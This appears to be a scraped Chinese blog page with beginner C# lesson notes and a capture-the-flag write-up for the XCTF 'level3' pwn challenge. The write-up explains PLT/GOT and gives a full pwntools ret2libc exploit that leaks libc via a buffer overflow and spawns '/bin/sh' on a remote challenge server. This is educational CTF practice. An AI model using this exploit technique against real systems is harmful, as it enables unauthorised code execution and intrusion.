-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/03/cs/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="甜药补习班吊尾生">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/04/03/cs/" class="post-title-link" itemprop="url">cs</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-04-03 11:58:26" itemprop="dateCreated datePublished" datetime="2021-04-03T11:58:26+08:00">2021-04-03</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-09-07 08:48:18" itemprop="dateModified" datetime="2021-09-07T08:48:18+08:00">2021-09-07</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>写在前面：没有提到的东西跟c++差不多</p>
-<h1 id="第一课">第一课</h1>
-<p>一个 C# 程序一般结果： using System 命名空间声明（namespace betql） class class属性 class方法 class class属性 class方法 语句（Statements）&amp; 表达式（Expressions） Main方法 语句（Statements）&amp; 表达式（Expressions）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">namespace HelloWorldApplication</span><br><span class="line">&#123;</span><br><span class="line">   class HelloWorld</span><br><span class="line">   &#123;</span><br><span class="line">      static void Main(string[] args)</span><br><span class="line">      &#123;</span><br><span class="line">         /* 我的第一个 C# 程序*/</span><br><span class="line">         Console.WriteLine(&quot;Hello World&quot;);</span><br><span class="line">         Console.ReadKey();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">//目前来说，这里基本可以当作格式</span><br></pre></td></tr></table></figure>
-<p><strong>类</strong>一般包含多个<strong>方法</strong>。 <strong>方法</strong>定义了<strong>类</strong>的行为。 <strong>Main</strong> 方法，是所有 C# 程序的 <strong>入口点</strong>。<strong>Main</strong> 方法说明当执行时 <strong>类</strong>将做什么动作。 <strong>Console.ReadKey();</strong> 是针对 VS.NET 用户的。这使得程序会等待一个按键的动作，防止程序从 Visual Studio .NET 启动时屏幕会快速运行并关闭。 <strong>WriteLine</strong> 是一个定义在 <strong>System</strong> 命名空间中的 <strong>Console</strong> 类的一个方法。</p>
-<p>注： C# 是大小写敏感的。 所有的语句和表达式必须以分号（;）结尾。 程序的执行从 Main 方法开始。</p>
-<h1 id="第二课">第二课</h1>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">namespace RectangleApplication</span><br><span class="line">&#123;</span><br><span class="line">    class Rectangle</span><br><span class="line">    &#123;</span><br><span class="line">        // 成员变量</span><br><span class="line">        double length;</span><br><span class="line">        double width;</span><br><span class="line">        public void Acceptdetails()</span><br><span class="line">        &#123;</span><br><span class="line">            length = 4.5;</span><br><span class="line">            width = 3.5;</span><br><span class="line">        &#125;</span><br><span class="line">        public double GetArea()</span><br><span class="line">        &#123;</span><br><span class="line">            return length * width;</span><br><span class="line">        &#125;</span><br><span class="line">        public void Display()</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(&quot;Length: &#123;0&#125;; Width: &#123;1&#125;; Area: &#123;2&#125;&quot;, length, width, GetArea());</span><br><span class="line">            //是的，是顺序和格式</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class ExecuteRectangle</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Rectangle r = new Rectangle();//类的实例化：通过已有的类（class）创建出该类的一个对象（object）</span><br><span class="line">            r.Display();//输出0</span><br><span class="line">            r.Acceptdetails();</span><br><span class="line">            r.Display();</span><br><span class="line">            Console.ReadLine();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>注： 当一个方法有超过两件事情，就分开来写。 面向对象&amp;面相对向的原理就是善用Class做分类。 不要将所有事情都写在一起，到时候有问题要全部重写。 也有可能别人在看代码需要很多时间去理解。 因此善用分类，让大家都能轻易读懂。 未来Class一定会建立很多，可能一个Class就只有2-3行。 但这就是单一职责，高内聚低耦合，让未来debug不会这么痛苦。 写不难，逻辑分清楚，让大家都能懂，这才难。</p>
-<h1 id="第三课-数据类型">第三课 数据类型</h1>
-<h2 id="值类型">值类型</h2>
-<p>对于一个变量有专属的一个内存地址</p>
-<h2 id="引用类型">引用类型</h2>
-<p>对于莫个地址有不同的变量指向它 比如定义引用类型 a=10，这时候在内存中保存的是 10，当把 a 赋给 b 的时候，他们两个应用的是同一个内存空间，b 的值会保存为 a 的值，当把 b 改为 20 时，应为 a 和 b 引用的是同一个所以 a 也变成 20 了</p>
-<p>装箱：值类型转换为对象类型 拆箱：之前由值类型转换而来的对象类型再转回值类型</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int val = 8;</span><br><span class="line">object obj = val;//先装箱</span><br><span class="line">int nval = （int）obj;//再拆箱</span><br></pre></td></tr></table></figure>
-<p><strong>字符串（string）类型</strong> 允许您给变量分配任何字符串值。</p>
-<p>字符串（string）类型的值可以通过两种形式进行分配：引号和 <span class="citation" data-cites="引号">@引号</span>。</p>
-<p>C# string 字符串的前面可以加 @（称作"逐字字符串"）将转义字符（）当作普通字符对待，比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string str = @&quot;C:\Windows&quot;;</span><br><span class="line">//等价于</span><br><span class="line">string str = &quot;C:\\Windows&quot;;</span><br></pre></td></tr></table></figure>
-<p>@ 字符串中可以任意换行，<strong>换行符</strong>及<strong>缩进空格</strong>都计算在字符串长度之内。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = @&quot;&lt;script type=&quot;&quot;text/javascript&quot;&quot;&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    --&gt;</span><br><span class="line">&lt;/script&gt;&quot;;</span><br></pre></td></tr></table></figure>
-<h1 id="第四课-类型转换">第四课 类型转换</h1>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">namespace TypeConversionApplication</span><br><span class="line">&#123;</span><br><span class="line">    class StringConversion</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            int i = 75;</span><br><span class="line">            float f = 53.005f;</span><br><span class="line">            double d = 2345.7652;</span><br><span class="line">            bool b = true;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(i.ToString());//C#提供的内置的类型转换方法</span><br><span class="line">            Console.WriteLine(f.ToString());</span><br><span class="line">            Console.WriteLine(d.ToString());</span><br><span class="line">            Console.WriteLine(b.ToString());</span><br><span class="line">            </span><br><span class="line">            int j = (int)f;//强制/显性进制转化，可能导致数据丢失</span><br><span class="line">            long k= i; //隐性进制转化，不会导致数据丢失</span><br><span class="line">            Console.WriteLine(j);</span><br><span class="line">            Console.WriteLine(k);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">75</span><br><span class="line">53.005</span><br><span class="line">2345.7652</span><br><span class="line">True</span><br><span class="line">53</span><br><span class="line">75</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
-<h2 id="c-类型转换方法">C# 类型转换方法</h2>
-<table>
-<thead>
-<tr class="header">
-<th>序号</th>
-<th>方法 &amp; 描述</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>1</td>
-<td><strong>ToBoolean</strong> 如果可能的话，把类型转换为布尔型。</td>
-</tr>
-<tr class="even">
-<td>2</td>
-<td><strong>ToByte</strong> 把类型转换为字节类型。</td>
-</tr>
-<tr class="odd">
-<td>3</td>
-<td><strong>ToChar</strong> 如果可能的话，把类型转换为单个 Unicode 字符类型。</td>
-</tr>
-<tr class="even">
-<td>4</td>
-<td><strong>ToDateTime</strong> 把类型（整数或字符串类型）转换为 日期-时间 结构。</td>
-</tr>
-<tr class="odd">
-<td>5</td>
-<td><strong>ToDecimal</strong> 把浮点型或整数类型转换为十进制类型。</td>
-</tr>
-<tr class="even">
-<td>6</td>
-<td><strong>ToDouble</strong> 把类型转换为双精度浮点型。</td>
-</tr>
-<tr class="odd">
-<td>7</td>
-<td><strong>ToInt16</strong> 把类型转换为 16 位整数类型。</td>
-</tr>
-<tr class="even">
-<td>8</td>
-<td><strong>ToInt32</strong> 把类型转换为 32 位整数类型。</td>
-</tr>
-<tr class="odd">
-<td>9</td>
-<td><strong>ToInt64</strong> 把类型转换为 64 位整数类型。</td>
-</tr>
-<tr class="even">
-<td>10</td>
-<td><strong>ToSbyte</strong> 把类型转换为有符号字节类型。</td>
-</tr>
-<tr class="odd">
-<td>11</td>
-<td><strong>ToSingle</strong> 把类型转换为小浮点数类型。</td>
-</tr>
-<tr class="even">
-<td>12</td>
-<td><strong>ToString</strong> 把类型转换为字符串类型。</td>
-</tr>
-<tr class="odd">
-<td>13</td>
-<td><strong>ToType</strong> 把类型转换为指定类型。</td>
-</tr>
-<tr class="even">
-<td>14</td>
-<td><strong>ToUInt16</strong> 把类型转换为 16 位无符号整数类型。</td>
-</tr>
-<tr class="odd">
-<td>15</td>
-<td><strong>ToUInt32</strong> 把类型转换为 32 位无符号整数类型。</td>
-</tr>
-<tr class="even">
-<td>16</td>
-<td><strong>ToUInt64</strong> 把类型转换为 64 位无符号整数类型。</td>
-</tr>
-</tbody>
-</table>
-<h1 id="第五课-c遗产">第五课 C++遗产</h1>
-<h2 id="读入">读入</h2>
-<p><strong>System</strong> 命名空间中的 <strong>Console</strong> 类提供了一个函数 <strong>ReadLine()</strong>，用于接收来自用户的输入，并把它存储到一个变量中。</p>
-<p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int num;</span><br><span class="line">num = Convert.ToInt32(Console.ReadLine());</span><br></pre></td></tr></table></figure>
-<p>函数 <strong>Convert.ToInt32()</strong> 把用户输入的数据转换为 int 数据类型，因为 <strong>Console.ReadLine()</strong> 只接受字符串格式的数据。</p>
-<h2 id="foreach">foreach</h2>
-<p>C# 也支持 foreach 循环，使用foreach可以迭代数组或者一个集合对象。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class ForEachTest</span><br><span class="line">&#123;</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        int[] fibarray = new int[] &#123; 0, 1, 1, 2, 3, 5, 8, 13 &#125;;</span><br><span class="line">        foreach (int element in fibarray)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Console.WriteLine(element);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>输出结果为： 0 1 1 2 3 5 8 13</p>
-<h1 id="第六课-封装">第六课 封装</h1>
-<p>public：所有对象都可以访问 private：对象本身在对象内部可以访问 protected：只有该类对象及其子类对象可以访问 internal：同一个程序集的对象可以访问 protected internal：访问限于当前程序集或派生自包含类的类型</p>
-<h1 id="第七课-数组">第七课 数组</h1>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/27/AD-level3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="甜药补习班吊尾生">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/03/27/AD-level3/" class="post-title-link" itemprop="url">AD_level3</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-03-27 13:28:44" itemprop="dateCreated datePublished" datetime="2021-03-27T13:28:44+08:00">2021-03-27</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-04-08 22:05:56" itemprop="dateModified" datetime="2021-04-08T22:05:56+08:00">2021-04-08</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="滚出新手村">滚出新手村</h1>
-<p>这是xctf新手区pwn题最后一题</p>
-<p>革命尚未成功同志仍需努力（×）</p>
-<p>只要我出了新手村就算成功（√）</p>
-<h1 id="plt表got表和libc">plt表、got表和libc</h1>
-<p>首先假定程序里有函数A，函数A的内容是调用printf函数。</p>
-<p>printf函数位于libc动态库内（系统内所以进程共享同一个动态库）。</p>
-<p>一个编译单元（例如一个.cpp文件）编译成一个或多个中间文件（.o），这些中间文件由汇编指令构成，但里面不会包含printf函数的具体地址，因为编译器不知道具体位置在哪，（只要不是在本文件内的地址都不知道），所以中间文件中本该有printf函数的地方（call ······）会由一个符号替代，这跟符号用于告诉链接器这里的地址需要修正。</p>
-<p>接下来链接器链接中间文件来形成可执行文件。过程中：需要确保不论需要修正的函数的地址是在另外一个中间文件中还是在libc中，程序都能工作。故链接器的工作模式为： 1.如果需要修正的函数的地址在.o文件中，链接文件，完成修正地址。 2.否则，链接器会生成一段可以获取printf函数在libc地址的代码段（也是一个函数），链接到这个函数上。故在这种情况下，只要在程序运行时才能真正确定printf函数的真正地址和printf函数执行内容的代码。</p>
-<p>PLT表（Procedure Link Table）：就是上述链接器形成的代码段，由这些代码段构成的表。</p>
-<p>GOT表（Global Offset Table）:存放libc真正功能性代码的地址，由这些地址构成的表。</p>
-<p>libc动态库：存放自带的可调用的功能性函数。</p>
-<img src="/2021/03/27/AD-level3/1.jpg" class>
-<h1 id="新增pythonpwntools内容">新增python、pwntools内容</h1>
-<p>相关内容已经更新在“pwn用到的工具汇总”</p>
-<h1 id="边学边做">边学边做</h1>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">63111</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3&quot;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got_addr)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>
-<p>现在程序执行到read函数中间 136个‘a’覆盖buf 再覆盖read函数中 存放母函数的ebp 接下来覆盖其返回地址为write_plt</p>
-<p>程序执行到read函数的ret，清空栈内包括write_plt_addr之前的所有东西，跳转到write_plt_addr</p>
-<p>对于write_plt_addr main_addr成了它的返回地址 1，write_got_addr，4，成了它的参数</p>
-<p>于是通过write_got_addr成功泄露了write_got，并返回main函数，用于其它操作。 即使这里main_addr改为其它地址，仍然成功能泄露write_got_addr。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">63111</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3&quot;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got_addr)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got = u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc_base = write_got - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload2=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p>p32()将数据打包成4位字节的其它形式，相应的u32只能解包4个字节的数据 libc中函数名地址可直接查出，但具体执行地址在哪执行不知道 通过libc中write的函数名地址和执行地址，算出相对偏移</p>
 
       
     </div>
